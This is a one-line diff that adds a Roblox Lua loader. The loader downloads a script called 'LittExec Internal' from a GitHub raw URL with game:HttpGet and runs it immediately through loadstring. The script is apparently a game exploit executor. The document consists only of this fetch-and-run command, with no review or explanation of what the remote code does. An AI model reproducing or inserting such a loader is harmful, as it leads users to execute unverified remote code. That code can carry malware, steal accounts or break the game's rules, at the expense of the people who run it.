@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Littmsn/LittExec/main/LittExec%20Internal'))()
